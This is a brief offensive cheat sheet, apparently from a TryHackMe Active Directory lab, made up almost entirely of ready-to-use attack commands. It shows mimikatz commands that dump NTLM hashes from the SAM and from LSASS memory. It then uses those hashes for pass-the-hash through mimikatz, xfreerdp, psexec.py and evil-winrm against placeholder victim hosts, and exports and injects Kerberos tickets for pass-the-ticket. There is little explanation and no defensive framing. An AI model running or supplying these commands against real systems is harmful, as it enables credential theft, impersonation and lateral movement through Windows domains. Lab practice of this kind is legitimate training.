# Active Directory

NTLM hashes from local SAM.

    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # lsadump::sam

NTLM hashes from LSASS memory.

    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # sekurlsa::msv

Using extracted hashes for pass the hash.

    mimikatz # token::revert
    mimikatz # sekurlsa::pth /user:elliot.alderson /domain:za.tryhackme.com /ntlm:654e4545455e5de /run:"some command"


RDP PTH

    xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH

psexec PTH

    psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP

WinRM PTH

    evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH

Pass-the-Ticket

    mimikatz # privilege::debug
    mimikatz # sekurlsa::tickets /export

Once the desired ticket has been extracted.
    mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi  

